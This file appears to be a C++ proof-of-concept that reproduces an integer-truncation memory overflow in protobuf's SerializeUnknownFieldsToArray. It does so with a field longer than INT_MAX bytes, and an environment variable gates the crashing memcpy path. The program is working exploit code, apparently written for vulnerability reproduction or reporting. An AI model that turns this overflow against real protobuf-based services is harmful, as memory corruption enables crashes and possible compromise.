#include <cerrno>
#include <climits>
#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <utility>

#include <sys/mman.h>

#include "google/protobuf/io/coded_stream.h"
#include "google/protobuf/unknown_field_set.h"
#include "google/protobuf/wire_format.h"
#include "google/protobuf/wire_format_lite.h"

int main() {
  using google::protobuf::UnknownFieldSet;
  using google::protobuf::internal::WireFormat;
  using google::protobuf::internal::WireFormatLite;

  const size_t payload_size = static_cast<size_t>(INT_MAX) + 256;
  std::fprintf(stderr, "[STATE] payload_size=%zu\n", payload_size);
  std::fprintf(stderr, "[STATE] INT_MAX=%d\n", INT_MAX);

  std::string payload;
  try {
    payload.resize(payload_size, 'A');
  } catch (const std::bad_alloc& e) {
    std::fprintf(stderr, "[FAIL] payload allocation failed: %s\n", e.what());
    return 2;
  }

  UnknownFieldSet unknown_fields;
  unknown_fields.AddLengthDelimited(1, std::move(payload));

  const size_t computed_size = WireFormat::ComputeUnknownFieldsSize(unknown_fields);
  const int stream_int_size = static_cast<int>(computed_size);
  const uint32_t write_string_size =
      static_cast<uint32_t>(unknown_fields.field(0).length_delimited().size());
  const int write_raw_signed_size = static_cast<int>(write_string_size);
  const unsigned int write_raw_unsigned_size =
      static_cast<unsigned int>(write_raw_signed_size);
  const int tag_size = google::protobuf::io::CodedOutputStream::VarintSize32(
      WireFormatLite::MakeTag(1, WireFormatLite::WIRETYPE_LENGTH_DELIMITED));
  const int length_prefix_size =
      google::protobuf::io::CodedOutputStream::VarintSize32(write_string_size);

  const long long predicted_end_minus_ptr_before_memcpy =
      static_cast<long long>(stream_int_size) -
      static_cast<long long>(tag_size + length_prefix_size);
  const unsigned int predicted_available_for_memcpy =
      static_cast<unsigned int>(predicted_end_minus_ptr_before_memcpy);
  const unsigned long long memcpy_overflow_delta =
      static_cast<unsigned long long>(write_raw_unsigned_size) -
      static_cast<unsigned long long>(predicted_available_for_memcpy);

  std::fprintf(stderr, "[STATE] field_count=%d\n", unknown_fields.field_count());
  std::fprintf(stderr, "[STATE] tag_size=%d\n", tag_size);
  std::fprintf(stderr, "[STATE] length_prefix_size=%d\n", length_prefix_size);
  std::fprintf(stderr, "[STATE] computed_size=%zu\n", computed_size);
  std::fprintf(stderr, "[STATE] stream_int_size=%d\n", stream_int_size);
  std::fprintf(stderr, "[STATE] computed_minus_stream_int=%lld\n",
               static_cast<long long>(computed_size) -
                   static_cast<long long>(stream_int_size));
  std::fprintf(stderr, "[STATE] write_string_size=%u\n", write_string_size);
  std::fprintf(stderr, "[STATE] write_raw_signed_size=%d\n", write_raw_signed_size);
  std::fprintf(stderr, "[STATE] write_raw_unsigned_size=%u\n",
               write_raw_unsigned_size);
  std::fprintf(stderr,
               "[STATE] predicted_end_minus_ptr_before_memcpy=%lld\n",
               predicted_end_minus_ptr_before_memcpy);
  std::fprintf(stderr, "[STATE] predicted_available_for_memcpy=%u\n",
               predicted_available_for_memcpy);
  std::fprintf(stderr, "[STATE] memcpy_overflow_delta=%llu\n",
               memcpy_overflow_delta);

  if (std::getenv("TRIGGER_SERIALIZE") == nullptr) {
    std::fprintf(stderr,
                 "[STATE] serialization not triggered; set TRIGGER_SERIALIZE=1 "
                 "to execute the crashing path\n");
    return 0;
  }

  void* mapping =
      mmap(nullptr, computed_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON,
           -1, 0);
  if (mapping == MAP_FAILED) {
    std::fprintf(stderr, "[FAIL] mmap failed: %s\n", std::strerror(errno));
    return 3;
  }

  std::fprintf(stderr, "[STATE] target=%p\n", mapping);
  std::fprintf(stderr, "[STATE] invoking SerializeUnknownFieldsToArray\n");

  uint8_t* target = static_cast<uint8_t*>(mapping);
  uint8_t* end = WireFormat::SerializeUnknownFieldsToArray(unknown_fields, target);

  std::ptrdiff_t written = end - target;
  std::fprintf(stderr, "[STATE] returned_offset=%td\n", written);

  munmap(mapping, computed_size);
  return 0;
}
